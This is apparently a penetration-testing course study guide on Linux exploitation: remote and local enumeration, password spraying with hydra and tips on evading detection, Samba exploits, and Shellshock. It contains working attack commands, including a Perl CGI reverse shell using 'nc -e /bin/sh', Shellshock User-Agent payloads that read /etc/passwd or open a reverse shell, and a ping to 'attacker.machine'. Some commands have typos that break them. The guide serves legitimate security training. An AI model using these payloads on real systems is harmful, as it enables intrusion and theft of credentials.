---
description: >-
  Linux and other variants of UNIX make up a very large segment of the overall
  internet infrastructure (including Critical Infrastructure).
---

# ‚≠ê WIP - Linux Exploitation

{% hint style="danger" %}
**This document is still in progress...** 
{% endhint %}

## Information Gathering

Information gathering and enumeration phases of any penetration test are considered the most important.

It is the result of these phases of the engagement that lead us to identify vulnerabilities, misconfigurations and ultimately to exploitation.

### Remote Enumeration - Study Guide

Remote Enumeration is the process of gathering as much information as possible about a target system from across-the-network perspective using all of the tools we have at our disposal.

#### OS Fingerprinting Re-cap

As a typical first step in identifying the OS of a target, we can use `nmap`:

```bash
# --osscan-guess enables aggressive OS detection
nmap -O --osscan-guess <ip_address>

# Open ports that are ususally returned from a port scan can offer OS insights
nmap -v -sT -O <ip_address>
```

The remote enumeration phase often begins with port scans for both TCP and UDP ports against target system/s, including service version fingerprinting `-sV`  and can be accomplished with a `nmap` command:

```bash
nmap -v -sS -sU -sV -n 192.168.0.1/24
```

#### Enumerating NFS

One of these commonly found services is the Network File System protocol, which is a RPC-based file sharing protocol often found configured on Unix-like systems, is typically used to provide access to shared resources, and can be found listening on TCP and/or UDP port 2049. `nmap` can easily identify a system running NFS. Note that since NFS is an RPC-based service and relies on other RPC services \(as `mountd`\) it should be directly queried via the Portmapper service which is found on port TCP and/or UDP 111 when using `nmap` NSE scripts:

```bash
nmap -sT -sU -sV -p2049 <ip_address>
```

An administrator wishing to share files from an NFS server will configure what are known as "exports", which are the mechanism used by NFS in order to export directories, in other words, make entire directories available to other users over the network. Exports configured for any given NFS serve can usually be found in the `/etc/exports` file on a target host locally.

One common issue with NFS is that often administrators will configure exports with little attention to security and usually export directories in a manner that allows any host or IP address to connect, without any authentication and if you're luck, also provide write-access to directories. 

Once we've identified that a server is running NFS, the first thing we want to do is to query it with several `nmap` NS scripts \(`nfs-ls`, `nfs-showmount` and `nfs-stafts`\). We can find them with:

```bash
ls /usr/share/nmap/scripts/ | grep nfs

# now we can obtain results relevant to NFS:
nmap --script nfs-ls, nfs-showmount-nfs-statfs <ip_address>
```

Alternatively we can use the built-in `showmount` command with the `-e` or `--exports` switches to show any exports that would be available to us as well. However, we can see it won't return as much information as `nmap`:

```bash
showmount -e <ip_address>
```

Ideally, an administrator would want to explicitly define \(whitelist\) IP addresses or hosts that should be allowed to connect to the NFS server. Even in the case where our access is restricted due to an NFS whitelist configuration like the above, the output still gives us valuable information regarding which IP addresses or hosts can mount any available exports. In this scenario, that information would be useful in the case we can either spoof our IP address to match a whitelisted IP address or take control of a host which is allowed to connect.

Once we've gathered the relevant NFS server information and have confirmed a misconfiguration, we can attempt to mount the available exported directories. This can be accomplished by first creating a temporary directory as your mount point, and then the exported NFS directory can be mounted:

```bash
mkdir -p /mnt/home/bob
mount -t nfs <nfs_server_ip>:/home/bob /mnt/home/bob -o nolock
mount # just test 
cd /mnt/home/bob && ls -al
```

#### Enumerating Portmapper \(rpcbind\)

`Portmapper` \(or rpcbind\) is another common service found on a Linux-based systems and is used to essentially "map" RPC or "ONC RPC" \(Open Network Computing Remote Procedure Call\) services to their corresponding TCP or UDP ports on a target system.

Information gleaned from the portmap service can offer insight regarding ports that are listening on a machine, but that may not necessarily be accessible over the network. A target system may be running a custom RPC service that is only accessible from the local host or may be running NFS, but only accessible from the local network, etc. Knowing this information can give us more insight to local services that may be running which could help us in further exploiting a system if and when local access has been obtained. `Portmapper` is typically found listening on ports TCP/UDP 111 and in some cases ports TCP/UDP 32771 and can be enumerated using `nmap` NSE scripts, or by using the built-in `rpcinfo` command.

Querying a single port \(TCP/111\) essentially enumerates all related RPC-related service ports without us having to conduct a port scan against all those ports individually. Furthermore, ii gives us knowledge of which ports the system has open locally \(bound to localhost\), which we couldn't normally identify with a usual port scan.

`nmap`'s `rpcinfo` and `rpc-grind` NSE scripts can be used to enumerate the Portmapper and associated RPC services:

```bash
nmap --script rpc-grind,rpcinfo <ip_address> -p 111

# the stand-alone rpcinfo command can also give similar results
rpcinfo -p <ip_address>
```

#### SMB \(Samba\)

It's a Linux-based implementation of the SMB/CIFS protocols, provides a print and file sharing services for Windows clients within an environment. Recent versions can also seamlessly be integrated with Active Directory domains. Samba can offer us a great bit of information when enumerated properly. 

Depending on the configuration, we can obtain OS version, user accounts on the system, file shares, their permissions and potentially sensitive data, and, depending on its integration with Active Directory, can be used to enumerate much more information. Improperly configured Samba servers can also lead to remote code execution among other things.

| Service | Port |
| :--- | :--- |
| netbios-ns \(Name Service\) | 137/tcp, 137/udp |
| netbios-dgm \(Datagram Service\) | 138/tcp, 138/udp |
| netbios-ssn \(Session Service\) | 139/tcp, 139/udp |
| microsoft-ds \(Naked CIFS\) | 445/tcp |

Samba can be trivially identified with a version scan against the NetBIOS ports:

```bash
nmap -sT -sU -sV <ip_address> -p136,137,138,139,445 --open
```

There are several smb-related NSE scripts to get an idea of shares that available on the target. We can use:

```bash
nmap --script smb-enum-shares <ip_address>
```

Alternatively we can also use `smbclient` to obtain similar info about shares, including Workgroup and NetBIOS name. Simply hitting 'enter; at the authentication prompt to obtain results also confirms that anonymous or guest access to the Samba server is enabled:

```bash
smbclient -L <ip_address>
```

In addition to simply listing shares which we have access to, we also want to know what type of access we have to which shares \(read only, write, etc\) with `smbmap`:

```bash
smbmap -H <ip_address>
```

Once we've identified shares, we have several options for interacting with them:

```bash
smbclient \\\\<ip_address>\\<share_name>

# or

mkdir /mnt/folder
# apt install cifs-utils
mount -t cifs \\\\<ip_address>\\<share_name> /mnt/folder
cd /mnt/folder && ls -las
```

#### SMB Users

Enumerating users when it comes to Samba or over SMB can be accomplished in several ways. 

**Method \#1: bash "for loop" and rpcclient**

Using `rpcclient` and list of potential usernames we've gather from other phases of information gathering:

```bash
for u in $(cat users.txt)
do
    rpcclient -U "" <ip_address> -N --command="lookupnames $u"
done
grep "User: 1"
```

There are several options available with `rpcclient`. Some useful commands include `loopupsids`, `netshareenum`, `srvinfo` and `enumprivs`.

**Method \#2: Automated \(enum4linux\)**

It can be used to enumerate the following:

* Operating system
* Users
* Password Policies
* Group Membership
* Shares
* Domain/Workgroup Identification

```bash
enum4linux <ip_addess>
```

#### Enumerating SMTP Users

You're probably familiar with the `HELO`, `RCPT` or `MAIL` verbs if you've ever sent an email while directly connected to an email server via `telnet` or some other way.

The following information does apply for both Windows and Linux-based mail servers since SMTP is the underlying protocol, but since a large majority of mail servers in-use are Linux-based, we'll be focusing on enumerating users from `sendmail`. If the wild, you'll mostly encounter `sendmail`, `postfix`, `exim` or Microsoft Exchange.

Similar to the user enumeration process for SMB users, there are several ways to accomplish this task either using manual methods or using tools designed for the purpose of enumerating users form a mail server.

The first task is to enumerate which options, verbs or features are enabled on an SMTP server, usually found on TCP/25:

```bash
nmap --script smtp-commands <ip_address> -p 25

# or

nc <ip_address>

# or 

telnet <ip_address>
```

We are interested in: `RCPT`, `VRFY` and `EXPN`.

Using `RCPT TO`, we can enumerate users via direct connection to the mail server with either `telnet` or `nc`. 

```bash
telnet <ip_address>
HELO
MAIL FROM
```

Valid users will return a Status code of `250 2.1.5` while a `550 5.1.1` status code and `User unknown` message denotes a non-existent user.

Another feature we can use to enumerate users in the `EXPN` feature, which was designed to be used to query a mail server for a list of members within a mailing list on a server. 

The typical command would be `EXPN mailing-list-name` or `EXPN username`.

Valid users will return a Status Code of `250 2.1.5` while `550 5.1.1` status code and `User unknown` message denotes a non-existent user.

Lastly the `VRFY` request can also be used an is more common than the `EXPN` method. The same command line can be used with `VRFY` and the results are similar to the `EXPN` output. Same status codes are used.

`smtp-user-enum` is a great tool that automates the user enumeration process for SMTP. `smtp-user-enum` tests all three methods, `RCPT`, `EXPN` and `VRFY` against a list of users:

```bash
smtpuser-enum -M VRFY -U users.txt -t <ip_address>
smtpuser-enum -M EXPN -U admin1 -t <ip_address>
smtpuser-enum -M RCPT -D users.txt -T mail-server.ips.txt
smtpuser-enum -M EXPN -D example.com -U users.txt -t <ip_address>
```

{% embed url="https://github.com/CiscoCXSecurity/enum4linux" %}

{% embed url="https://en.wikipedia.org/wiki/Network\_File\_System" %}

{% embed url="https://en.wikipedia.org/wiki/Open\_Network\_Computing\_Remote\_Procedure\_Call" %}

{% embed url="https://en.wikipedia.org/wiki/Portmap" %}

{% embed url="https://en.wikipedia.org/wiki/Samba\_\(software\)" %}

{% embed url="https://www.proofpoint.com/us/products/email-protection/open-source-email-solution" %}

{% embed url="https://en.wikipedia.org/wiki/Server\_Message\_Block" %}

{% embed url="https://github.com/ShawnDEvans/smbmap" %}

{% embed url="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" %}

{% embed url="https://github.com/insidetrust/statistically-likely-usernames" %}

{% embed url="https://cr.yp.to/smtp/mail.html" %}

{% embed url="https://cr.yp.to/smtp/vrfy.html" %}

### Local Enumeration - Study Guide

We go for local enumeration once we've obtained access to a Linux machine.

* either as a low privileged or high privileged user
* via a shell
* through a web application

... with the ultimate goal of obtaining higher-level access to our current machine and access to other machines within an environment as a result of information obtained from our exploited host.

#### Network Information

We can ask ourselves some important questions:

* How is the exploited machined connected to the network?
* Is the machine multi-homed? Can we pivot to other hosts in other segments?
* Do we have unfettered outbound connectivity to the internet or is egress traffic limited to certain ports or protocols?
* Is there a firewall between me and the other devices/machines?
* Is the machine I'm on communicating with other hosts? If so, what is the purpose or function of the hosts that my current machine is communicating with?
* What protocols are being used that are originating from my actively exploited machine? Are we initiating FTP connections or other connections \(ssh, etc\) to other machines?
* Are other machines initiating a connection with me? if so, can that traffic be intercepted or sniffed as cleartext in transit? Is it encrypted?

**Ifconfig**

Used to get information regarding our current network itnerfaces. We want to know what our IP address is, and whether or not there are additional interfaces that we may be able to use as pivots to other network segments.

```bash
ifconfig -a
```

**route**

Used to print our current network routes, which includes our gateway. Knowing what our static routes and gateway are can help us in case we need to manually configure our network interfaces, pivot to other network segments or will come in handy if we decide to execute ARP-poisoning or other MITM attacks.

```bash
route -n
```

**traceroute**

Sometimes we'll want to know how many hops there are between our compromised machine and other network segments:

```bash
traceroute -n <ip_address>
```

**DNS Information**

* What machine is resolving our DNS queries?
* Can we use it to exfiltrate data over a DNS tunnel?
* Is the DNS server vulnerable to any exploits?
* Is it an Active Directory controller?

```bash
cat /etc/resolv.conf
```

**ARP Cache**

The systems' ARP cache can be used to give us a bit of situational awareness regarding machines near us, or machines that our currently exploited system communicates with for one reason or another. This information is useful when it comes down to determining who we're communicating with, what's being communicated and whether that traffic or communication has any value to us from an exploitation perspective, like credentials transmitted in cleartext:

```bash
arp -en
```

**netstat**

Gives us insight regarding:

* What other machines or devices we are currently connected to.
* Which ports or services on other machines we are connected to.
* What ports our current machine are listening on.
* Are there other systems establishing connections with our current machine.

We can list all TCP and UDP connections to other systems and listening services with:

```bash
netstat -auntp
```

In the rare case you're on a very restricted system, the netstat command is missing, you can get similar information from the `/proc/net/tcp` and `/proc/net/udp` files.

**ss**

An alternative to `netstat` that we can use to list active networks connections.

```bash
ss -twurp
```

Gives another perspective on established connections, bytes being transferred, and the processes/users responsible for the connections.

**Outbound Port Connectivity**

Another thing we want to check is whether or not our outbound port connectivity is restricted in any way.

Knowing this information will be useful if we need to establish outbound connections to other systems we control for the purpose of maintaining access or exfiltrating data.

A quick way we can check outbound port connectivity status is with `portquiz.net`, which is a web server which has most TCP ports listening. We can use it to confirm we can connect to arbitrary ports outside of our network with a quick `nmap` scan:

```bash
nmap -sT -p4444-4450 portquiz.net
```

Keep in mind that any scans originating from your compromised machine can alert network administrators of anomalous activity. Consider using nmap's `--T` \(timing\) option at a low value to stay under any internal IDS radar.

**Network Information Commands**

```bash
cat /etc/resolv.conf            # DNS Server
ifconfig -a                     # list current network interface configuration
route                           # current network route information
traceroute -n <ip_address>      # trace our route accross network segments
arp -a                          # list our ARP cache
netstat -auntp                  # established and listening TCP/UDP ports/connections
ss -twurp                       # listing active connections, processes, users and bytes
nmap -sT -p5555 portquiz.net    # check outbound firewall rules
```

#### System Information

The System Information gathering phase is much like the Network Information phase, except we're getting much more data. Our goal with this phase is to get information regarding:

* OS and Kernel
* Env Variables
* Interesting Files and Sensitive Information
* Users, Groups, Permissions and Privileges
* Services and Associated Configuration Files
* Cron Jobs, System Tasks
* Installed Applications and Versions
* Running Processes

Our ultimate objective from this portion of the testing is to elevate our privileges once we've obtained access to a system or systems and obtain additional footholds within an environment as a result of the information we obtain.

```bash
id                    # current user information
uname -a              # kernel version
grep $USER /etc/passwd # Current User Information from /etc/passwd
lastlog               # most recent logins
w                     # who is currently logged onto the system
last                  # last logged on users

# all users including UID and GID information
for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user;done

# List all UID 0 (root) accounts
cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut 0f1 0d":" | awk '{print $1}'

cat /etc/passwd       # Read passwd file
cat /etc/shadow       # check readibility of the shadow file
sudo -l               # what can we sudo without a password
cat /etc/sudoers      # can we read /etc/sudoers file?
cat /root/.bash_history # can we read roots .bash_history files?
cat /etc/issue        # OS
cat /etc/*-release    # OS

# can we sudo known binaries that allow breaking out into a shell?
sudo -l | grep vim
sudo -l | grep nmap
sudo -l | grep vi

ls -als /root/        # can we list root's home directory?
echo $PATH            # current $PATH env variable
cat /etc/crontab && ls -als /etc/cron*    # list all cron jobs
find /etc/cron* -type f -perm -o+w -exec ls -l {} \; # find world-writeable cron jobs
ps auxwww             # list running processes
ps -u root            # list all processes running as root
ps -u $USER           # list all processes running as current user
find / -perm -4000 -type f 2>/dev/null    # Find SUID files
find / -uid 0 -perm -4000 -type f 2>/dev/null    # Find SUID files owned by root
find / -perm -2000 0type -f 2>/dev/null          # Find GUID files
find -perm -2 -type f 2>/dev/null                # Find wolrd-writable files
ls -al /etc/*.conf                               # list all conf files in /etc/
grep pass* /etc/*.conf    # Find conf files that contain the string "pass*"
lsof -n                   # list open files
dpkg -l                   # list installed packages (debian)

# Common software versions
sudo -V 
httpd -v
apache2 -v
mysql -V
sendmail -d0.1

# print process binaries/paths and permissions
ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null |awk '!x[$0]++'
```

#### LinEnum

Automatic Information Gathering Tool which takes care of a lot of that process.

#### LinuxPrivChecker

Privilege escalation method finder.

#### unix-privesc-check

Script for finding common misconfigurations which can help us elevate our privileges on a Linux-based system.

#### mimipenguin

Tool we can use for dumping the logon password for the currently logged on user, this should be done during the post-exploitation phase.

{% embed url="https://web.archive.org/web/20200218150604/https:/www.rebootuser.com/?p=1623" %}

{% embed url="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" %}

{% embed url="https://github.com/FuzzySecurity/Unix-PrivEsc" %}

{% embed url="https://github.com/rebootuser/LinEnum" %}

{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}

{% embed url="https://github.com/huntergregal/mimipenguin" %}

{% embed url="https://staaldraad.github.io/2017/12/20/netstat-without-netstat/" %}

{% embed url="http://portquiz.net/" %}

{% embed url="https://github.com/FuzzySecurity/Unix-PrivEsc" %}

{% embed url="http://pentestmonkey.net/tools/audit/unix-privesc-check" %}

### ‚ñ∂ Information Gathering

### üß™Linux Exploitation: Lab 1 - Remote Enumeration

### üß™Linux Exploitation: Lab 2 - Local Enumeration

## Exploitation over the Network

### Remote Exploitation Introduction - Study Guide

Once we've identified vulnerabilities or misconfigurations as  a result of the Information Gathering phase, the next logical step is to continue our enumeration and move into exploitation phase.

### Password Spray Attack / Reverse Brute-Force attack

Rather than the usual dictionary brute force methods involving a dictionary of hundreds if not millions of password entries, the idea is to reverse the process and instead, introduce a list of as many users as possible, while trying just a single password attempt against tens or hundreds of user accounts.

This method reduces the potential for accounts lockouts and in some cases, allows us to stay "under the radar" when attempting single passwords against many users. To successfully execute a password spray attack, we must first gather as many usernames as possible in regard to our target organization or target system. 

We can use tools such as `theHarvester` to get an idea of user naming conventions organizations are using for their users. Utilizing more than one tool to help compile an initial user list will only help us in our quest.

For enumerating SMTP users: `smtp-user-enum` and also several manual methods as `VRFY`,`EXPN`Metasploit also contains an auxiliary scanner module known as `smpt_enum`.

First we'll need to create our initial user list. We can quickly create a list of 50 users with the following command, where `john.txt` is taken directly from the `Statiscally Likely Usernames` list:

```bash
head -n john.txt >> users.txt
```

Once we've created our initial list of users, combined with users we've gathered from other phases of testing, we can execute our user enumeration process using the Metasploit `smtp_enum` module against our target SMTP server:

```bash
msf > use auxiliary/scanner/smtp/smtp_enum
msf > set RHOSTS <ip_address>
msf > set USER_FILE users.txt
msf > run
```

When the scanner completes \(which may take several minutes depending on how many users are in our list\), we can se e that we've validated several users that we can use for our password spray attack. We can now create a list of validates users. Add those to your `valid_users.txt` file, \(one on each line\) with any others you m ay have validated during information gathering. 

The more users we can validate, the higher the probability that our password spray attack will succeed; so aim to create as large a list as possible, of validated user accounts.

Now that we have validated some users, we should determine one \(recommended\) or two \(maximum\) commonly-used passwords we can use for our attack.

Regarding commonly used passwords, real-world experience has shown that one of the most commonly used passwords are usually found to be the current season, along with the current year, e.g., Spring2018.

You'll be surprised at how many times you will come across multiple users, within the same environment, using the same exact password in the "Season\[Year\]" format. Use this lack of configuration of password complexity and human nature to choose easy-to-remember passwords to your advantage. 

Another very common password "CompanyName" along with a numerical value, e.g., `FooCorp01` , `FooCorp02` , etc.

For our password list, we'll start with just using `Spring2018` as it's very common. Use your imagination when picking a password that relates to your target in some way or another.

In environments where password complexity is not enabled \(a common observation in Linux-based networks\), users will take advantage of using easy-to-remember passwords that they'll modify by simply changing a value or other characteristic over time \(as `Password01` to `Password02` or `Summer2018` to `Fall2018` etc\).

From month to month, season to season, making minor modifications to their passwords will be enough to please the systems' passwords policy.

Now that we have a list of users we've validated, and a list containing two very common passwords, we can start our password spray attack against other services on our target machine. 

Also keep in mind that password re-use is also a frequent issue and passwords may be reused across systems within an environment. 

First let's determine some other services that are listening on our target system that we can execute a password spray attack against using `nmap` : 

```bash
nmap -sT <ip_address> --open -max-retries 1 -n
```

Now that we have determined that there are several services we can execute our password spray attack against; `ssh`, `smtp` and `smb` as they utilize some form of authentication or another. 

We'll use `ssh` just to demonstrate that we can use one particular service \(as `SMTP` \) to enumerate for valid users that we can then use to attack an unrelated service, as `ssh`.

**To summarize:**

1. We've created a list of users gathered through our information gathering phase, in addition to using usernames from `Statistically Likely Usernames` list. 
2. We've confirmed valid users using SMTP user enumeration with the `smtp_enum` Metasploit scanner module.
3. We've created our list of validated user accounts, and a list containing two commonly-used passwords.
4. We've determined several services on our target machine we can execute our password spray attack against and have decided on `ssh`.

Now that all those pieces are in place, we can execute our password spray attack against the SSH service.  `THC-Hydra` is a well-known and tested brute-force tool.

Withy `hydra` we can supply our list of users \(`-L`\), our password list \(`-P`\) and specify the service we'd like to attack `ssh`, with a command line similar to the following:

```bash
hydra -L users.txt -P passwords.txt ssh://<ip_address>
```

Once we've obtained valid credentials for a single user, we can also exploit the common case of "password reuse" within an environment.

Using the obtained credentials, we can then use those to attempt to log in to other SSH-enabled machines as our user. This often results in access to multiple systems  which can then later be used as pivots to other areas of the network or to maintain multiple footholds, etc.

Of course, this can also be done with Hydra, and in a single sweep we can determine other systems on the network, which allow access using the same credentials we've cracked. We would use the `-M` parameter to specify a list of `ssh` servers. Something like the following:

```bash
hydra -l david -p Spring2018 -M ssh_servers.txt ssh
```

Where `ssh_servers.txt` is a file containing your `ssh` target servers, one per line.

In addition to trying your password spray attack against the `ssh` service we encourage you to also experiment with brute forcing `SMB` or any other listening services that accept user credentials if found as well. 

Metasploit's `smb_login` scanner module can be used to obtain similar results for password spray attacks against SMB services.

Aside from targeting Linux-based systems with password spray attacks, the same concept is, of course, valid for any type of environment or platform, as long as the service provides a means to authenticate to it.

With that said, password spray attacks are also known to be very successful against platforms such as Outlook Web Access or Exchange Portals.

Try this attack using Metasploit's `owa_login` brute-force module on OWA portals you are authorized to test against for great results using the Password Spray method.

**A Word of Caution Regarding Password Spraying**

Depending on system configurations, Password Spray Attacks can be detected and thwarted, which is why it is crucial to only attempt one \(recommended\) to two \(maximum\) passwords during a single run.

Take extra care that whichever tool you're using isn't trying blank passwords or other variations in addition to whatever is in your password list. 

This would add the authentication attempts and likely result in account lockouts or detection by a SIEM or other anomalous event detection solution.

Furthermore, after attempting a password spray attack run, fi unsuccessful the first time around, wait 45 minutes and try again with new passwords in your list.

Multiple attempts within a certain time-range can also result in detection and/or lockouts.

{% embed url="https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/" %}

{% embed url="https://en.wikipedia.org/wiki/Brute-force\_attack\#Reverse\_brute-force\_attack" %}

{% embed url="https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb\_login/" %}

{% embed url="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" %}

{% embed url="https://github.com/insidetrust/statistically-likely-usernames" %}

{% embed url="https://github.com/vanhauser-thc/thc-hydra" %}

{% embed url="https://github.com/laramies/theHarvester" %}

### Exploiting Samba - Study Guide

Samba is quite commonly found within Linux-based environments, as it typically provides file sharing services to both Windows and Linux users.

It's also a ripe target when configured incorrectly, and version **up to 4.6.4**, contain vulnerabilities that allow an attacker to take control of an affected server completely. This was most recently seen with **CVI-2017-7494** sometimes referred to as _SambaCry_. 

It will be important that we identify the exact versions of Samba, as well as identify vulnerabilities that exist in either the versions or configurations, and then exploitation of the systems.

The first task requires identifying that Samba is installed on the system and furthermore, identifying the version of Samba; this can be accomplished with a nmap `smb-os-discovery` script scan for port 445:

```bash
nmap --script smb-os-discovery -p445 <ip_address>
```

Once the version of Samba is known, we can start to investigate exactly which vulneratiblities might be present for that particular version. 

`searchsploit` is an excellent tool for this and allows us to search all vulnerabilities for a particular software directly from the Linux command line. `searchsploit` is a local database of all exploits that can also be found online \(www.exploit-db.com\)

```bash
searchsploit samba 3.0.20
```

From its results we can see that we have potential vulnerability candidate. We optionally have a Metasploit module indicator as well.

#### Username Map Script: CVE-2007-2447

This vulnerability was discovered in 2007 by an anonymous researcher and affects Samba versions 3.0.0 through 3.0.25rc3 and exists in non-default configurations where the "username map script" option is enabled, which results in remote command execution and compromise of the affected server.

```bash
msf> use exploit/multi/samba/usermap_script
msf> set RHOST <ip_address>
msf> set LHOST <ip_address>
msf> exploit
```

Once the exploit is completed, we have a command Shell Session we can immediately start interacting with.

In order to have a proper Pseudo TTY:

```text
python -c 'import pty; pty.spawn("/bin/sh");'
```

#### Samba Symlink Directory Transversal

Another vulnerability which is a result of a particular misconfiguration in Samba but with sometimes catastrophic consequences. This vulnerability essentially allows an attacker to create a symbolic link to the root partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory. 

Although this vulnerability can be exploited using `smbclient`, Metasploit contains a module for exploitation:

A pre-requisite to this particular vulnerability requires that the Samba server contains a writeable share and that the `widelinks` parameter in the `smb.conf` file is set with a value of `yes`. We can use the following `smbmap` command to determine shares available to us on a Samba server, in addition to determining whether or not we have read or write permissions to a given share:

```bash
smbmap -H <ip_address>
```

Once we've determined a writeable share is available, we can use Metasploit's `samba_symlink_traversal` auxiliary module to create the symlink to the root filesystem. 

```bash
smbclient \\\\<ip_address>\\<folder> -N
# -N anonymous access to the share 
```

Downloading/uploading files can be achieved through `get/put` commands. 

Additionally another useful command for data exfiltration when conducting post-exploitation tasks using `smbclient` is the `tar` command

```bash
smb :> tar c .. /tmp/allfiles.tar *
```

#### Writeable Samba Share to Remote Command Execution via Perl Reverse Shell

We will cover what we can do in certain situations where we have a fully patched Samba server, but have a writeable share available to us, and can exploit that scenario for remote command execution, in this case, a reverse shell.

In this case, we discover that a server we have enumerates is running a patched Samba server and contains a shared named `www` which appears to be possibly configured to allow administrators to easily update an internal web application.

We first determine OS and Samba version

```bash
nmap --script smb-os-discovery -p445 <ip_address>
```

We also determine any shares that are available to us, as well as seeing that Guest sessions to the shares are possible as well:

```bash
smbmpa -H <ip_address>
```

1. Web roots often contain files specific to a web server configuration and can furthermore be used to obtain credentials to other services \(e.g., MySQL\).
2. Being able to write to a web root, is even better depending on the web server configuration, for instance:
   1. Is PHP installed?
   2. Are there any other web server-interpreted languages we can use to our advantage?
   3. Can we upload any files to this directory?
   4. How will the web server handle our files?
   5. Can we exploit that to obtain remote command execution?

Our first task is to connect to the share, and have a look at its contents, and secondly, we'll want to determine if the Samba server has any HTTP ports listening, which might be serving contents of the share.

We can connect to the share with `smbclient` and execute the linux `ls` command to list files within the directory:

```bash
smbclient \\\\<ip_address>\\<holder> -N
```

Imagine the presence of a `.pl` extension indicates that the server is likely configured to process Perl. Knowing this configuration, it's time to make sure to scan against webserver ports to confirm we have a webserver running:

```bash
nmap -sT <ip_address> --max-retries 1 -n --open
```

Let's create a file locally on the attacker system called `test.pl`. The contents of this file will execute the `id` Linux system command and will display your current UID and GID information when access with your browser. 

```bash
#!/usr/bin/perl

print "Content-type: text/html\n\n";
system("id");
```

And then:

```bash
smbclient \\\\<ip_address>\\www -N
smb: \> put test.pl
```

Now if we point a browser to our `test.pl` the `id` command is shown. But from this point we can utilize some tools that have already been written to get us a reverse shell on the system. The script itself will require some minor modifications before we can use it \(as `$ip` , `$port` \). Once modified, upload it to the target via `smbclient`. Open a `nc` listerner before:

```bash
nc -nlvp 1234
```

Alternately, instead of using a pre-made Perl reverse shell, we could have our own script looking like:

```perl
#!/usr/bin/perl

print "Content-type: text/html\n\n";
system("nc <ip_address> 1234 -e /bin/sh")
```

{% embed url="https://www.samba.org/samba/news/symlink\_attack.html" %}

{% embed url="https://www.samba.org/samba/security/CVE-2007-2447.html" %}

{% embed url="https://cve.circl.lu/cve/CVE-2017-7494" %}

{% embed url="https://www.exploit-db.com/" %}

{% embed url="https://nmap.org/nsedoc/scripts/smb-os-discovery.html" %}

{% embed url="https://en.wikipedia.org/wiki/Netcat" %}

{% embed url="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell" %}

{% embed url="https://en.wikipedia.org/wiki/Samba\_\(software\)" %}

{% embed url="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap\_script/" %}

### Exploiting Shellshock - Study Guide

"Shellshock" or "Bashdoor", disclosed on September 24th 2014 is yet another vulnerability that shook the information security industry. Within hours of its release, thousands of devices and systems had already been compromised and botnets were created for the purpose of its exploitation "en-masse".

The vulnerability was discovered in the Unix Bash Shell, and affected CGI programs on web servers, Open SSH, DHCP clients and several other attack vectors.

The discovery of Shellshock resulted in several CVE's being assigned to different attack vectors:

* CVE-2014-6271
* CVE-2014-6277
* CVE-2014-6278
* CVE-2014-7169
* CVE-2014-7186
* CVE-2014-7187

We'll focus on the CGI attack vector.

To start understanding Shellshock, let's take a look at one method that was released in order to determine if a system was vulnerable, form a local system perspective. We can take the following as an example, as it relates directly to the initial CVE that was assigned \(CVE-2014-6271\). When executed on a vulnerable system, the shell would echo "vulnerable" as seen below:

```bash
env x=`() { :;}; echo vulnerable` bash -c "echo this is a test"

# when executed in a vulnerable bash shell, the string essentially
# executes an environment variable called "x".

# "x" in turns runs the "echo vulnerable" command, which is outside
# of the environment variable function
```

One of the primary attack verctors that was seen in the wild following the disclosure of Shellshock was the modification of `User-Agent` strings to include Shellshock payloads intended to run commands on the remote server. One example of this that was seen in-the-wild, was a "recon" test which would confirm to an attacker that a particular system was vulnerable; this was accomplished by modifying a sent `User-Agent` string to include `ping` command destined for the attacker's machine along with a unique payload.

If the attacker system receives the unique payload string, then this serves as confirmation that the system ran the `ping` command. The attacker could then tie it back to a specific vulnerable system for further exploitation later. 

The `User-Agent` string for that test would have been something like the following:

```bash
User-Agent: () { :;}; ping -c 5 -p unique_string attacker.machine
```

Now that we've covered a little bit of the history of Shellshock, and some basics about its exploitation, we can start applying our knowledge to an actual scenario. Since we know that a primary attack vector was against vulnerable CGI programs, let's have a look at some things we can do to identify vulnerable programs and systems, and then exploit.

One of the first things we need to do is to locate CGI programs on a potentially vulnerable system; we can do this with an excellent tool called `dirsearch` which is used to execute dictionary-type attacks against web servers in search for interesting files, directories, etc.

```bash
./dirsearch.py -u http://<ip_address>/ -e cgi -r
```

Now that we've identified a `cgi` file on the server let's first confirm that we can access the file with a browser, maybe the page contains some hints as to its purpose.

We can use nmap `http-shellshock` nmap NSE script:

```bash
nmap --script http-shellshock --script=args uri=/cgi-bin/login.cgi <ip_address> -p 80
```

There are multiple ways to exploit Shellshock to gain control over a system. Basically we can execute any command we want on the remote system as the web server user is successful. We could `wget` the `/etc/passwd`.

```bash
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://<ip_address>/cgi-bin/login.cgi && cat login.cgi
```

This will issue a GET request to the target system, use a Shellshock-ified `User-Agent` \(`-U`\) to `echo` the contents of `/etc/passwd` to a local file on our attacker system \(`login.cgi`\) and then display its contents to us \(`&& cat login.cgi`\).

If successful, we should see the contents of the target system's `/etc/passwd` file displayed in our terminal.

Now we could even run a reverse shell:

{% tabs %}
{% tab title="Perl" %}
```bash
wget -U "() { foo;};echo; /bin/nc <ip_address> <port> -e /bin/sh" http://<ip_address>/cgi-bin/login.cgi
```
{% endtab %}

{% tab title="nc" %}
```
nc -lvnp <port>
```
{% endtab %}
{% endtabs %}

{% embed url="https://en.wikipedia.org/wiki/Bash\_\(Unix\_shell\)" %}

{% embed url="https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)\#Initial\_report\_\(CVE-2014-6271\)" %}

{% embed url="https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)\#CVE-2014-6277" %}

{% embed url="https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)\#CVE-2014-6278" %}

{% embed url="https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)\#CVE-2014-7169" %}

{% embed url="https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)\#CVE-2014-7186" %}

{% embed url="https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)\#CVE-2014-7187" %}

